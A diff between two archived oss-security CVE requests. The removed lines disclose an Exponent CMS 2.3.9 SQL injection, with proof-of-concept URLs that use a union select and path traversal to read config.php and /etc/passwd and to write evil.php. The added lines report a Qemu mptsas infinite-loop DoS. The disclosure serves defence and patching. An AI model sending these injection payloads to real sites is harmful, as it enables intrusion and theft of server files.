@@ -1,43 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/1
-Message-ID: <CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>
-Date: Sun, 18 Sep 2016 11:52:58 +0800
-From: felix k3y <felixk3y@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE request：Exponent CMS 2.3.9 SQL injection vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/24/4
+Message-ID: <alpine.LFD.2.20.1605241505150.26750@wniryva>
+Date: Tue, 24 May 2016 15:07:37 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Li Qiang <liqiang6-s@....cn>
+Subject: CVE Request: Qemu: scsi: mptsas infinite loop in mptsas_fetch_requests
 Content-Type: text/plain; charset=utf-8
 
-Hi , I reported the following SQL Injection vulnerability to the
-ExponentCMS team on Sep 15, 2016:
+   Hello,
 
-https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/pixidou/controllers/pixidouController.php#L83-L91
-The "fid" parameter fail to sufficiently sanitize before using it in an SQL
-query, In This vulnerability, also lead to  Directory traversal、Remote code
-execution vulnerabilities etc..
+Quick Emulator(Qemu) built with the LSI SAS1068 Host Bus Adapter emulation 
+support is vulnerable to an infinite loop issue. It could occur while fetching 
+new requests in mptsas_fetch_requests().
 
-1) Directory traversal vulnerability
-http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
-union select
-1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../framework/conf/config.php
+A privileged user inside guest could use this flaw to consume excessive host 
+resources or crash the Qemu process resulting in DoS.
 
-2) Remote code execution
- i. Upload any legal files through website(.jpg|.gif etc..)
- ii. copy file to evil file(.php etc..)
+Upstream patch:
+---------------
+   -> https://lists.gnu.org/archive/html/qemu-devel/2016-05/msg04027.html
 
-Proof of concept:
-http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
-union select
-1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../../../../../../../etc/passwd
+This issue was discovered and reported by Li Qiang of 360.cn Inc.
 
-And Now, The SQL Injection vulnerability have been fixed.
-https://exponentcms.lighthouseapp.com/projects/61783/changesets/c1092f167cc6c78dc8bf9bf149946c5219413df3
-https://github.com/exponentcms/exponent-cms/commit/c1092f167cc6c78dc8bf9bf149946c5219413df3
-
-Has a CVE been assigned to this issue already? if not I request that
-one is assigned.
-
-thx.
---------------------------------------
-penghua # silence.com.cn
-PKAV Team
-
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
